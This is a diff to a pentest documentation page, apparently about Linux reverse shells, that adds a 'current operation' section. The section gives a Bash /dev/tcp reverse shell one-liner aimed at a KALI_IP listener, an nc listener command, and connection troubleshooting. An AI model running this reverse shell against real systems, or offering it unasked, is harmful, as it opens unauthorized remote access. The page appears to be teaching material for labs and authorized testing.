@@ -7,7 +7,37 @@ boost: 10
 hideFooterPagination: true
 ---
 
+import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+
 {/* Generated from Commands/linux-reverse-shell.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+
+## Current operation: Connect a Bash command session to a listener
+
+**Run in:** Linux target shell. **Requires:** Bash with TCP redirection support and a reachable Kali nc -lvnp 4444 listener; replace the callback address with one reachable from this target.
+
+```bash
+bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'
+```
+
+**Read the result:** Verify which shell is executing the payload and which network address is reachable from the target.
+
+**If The command exits or the listener never receives a connection:** Bash-specific redirections do not work in every /bin/sh implementation; a listener on the wrong interface cannot receive the callback.
+
+**Next check:** Check Bash availability, shell quoting, egress and listener binding independently; after connection verify id and the hostname before upgrading the terminal.
+
+**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
+
+### Reviewed operation documentation
+
+- [Primary reference 1](https://www.gnu.org/software/bash/manual/html_node/Redirections.html)
+
+## Preserved earlier notes
+
+<PreservedNotes>
+
+Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
 
 ## Turn execution into a usable session
 
@@ -161,3 +191,5 @@ Replace &lt;ATTACKER_IP>; the saved recipe uses /tmp/f.
 - [Shells, Payloads, and Interactive TTYs](/exploitation/shells-payloads-cheat-sheet)
 
 {/* VAULT_RELATED_END */}
+
+</PreservedNotes>
